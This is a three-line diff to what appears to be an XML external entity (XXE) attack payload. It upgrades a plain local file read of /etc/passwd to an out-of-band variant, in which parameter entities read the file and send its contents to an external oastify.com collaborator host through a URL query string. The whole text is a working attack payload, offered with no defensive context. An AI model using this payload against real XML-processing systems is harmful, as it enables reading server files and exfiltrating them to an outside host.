@@ -1,1 +1,3 @@
-<!ENTITY xxe SYSTEM "file:///etc/passwd">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % send SYSTEM "https://6v2c4wdk7n0lnhfg05qarxgev51wpodd.oastify.com/?data=%file;">
+%send;
